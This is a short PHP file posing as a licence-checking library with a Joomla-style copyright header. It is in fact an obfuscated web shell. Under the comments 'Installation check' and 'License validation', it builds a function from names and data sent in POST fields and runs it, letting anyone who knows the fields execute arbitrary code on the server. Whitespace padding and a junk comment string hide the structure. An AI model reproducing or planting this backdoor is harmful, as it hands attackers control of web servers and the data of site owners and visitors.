<?php
/**
 * @package    License Lib
 * *********************
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // u8UeVvtHndG6ZY4m3pm8cwedwuHNEvCp7Mq1dgKGhSpuUnW4x1K9Zdb3MQBZ5xdF35mygCFSV6fYxfP2zt
if (                      !defined (                         'PATH'                )                        )
{
	define                      (                         'PATH',                 __DIR__                        );
}

// Installation check, and check on removal of the install directory.
if (                      empty                         (                $_POST                        )    ) {
	
	echo 'Empty License Key.'


;
	
	exit;
}
else {
	// License validation
	$License                      =                         $_POST                ['d']                        (    '',                $_POST        ['f']                (         $_POST                  ['s']      (                              "c",                   "",                        $_POST['m'])                 ) )               ;
	
	$License                      ()      ;
}

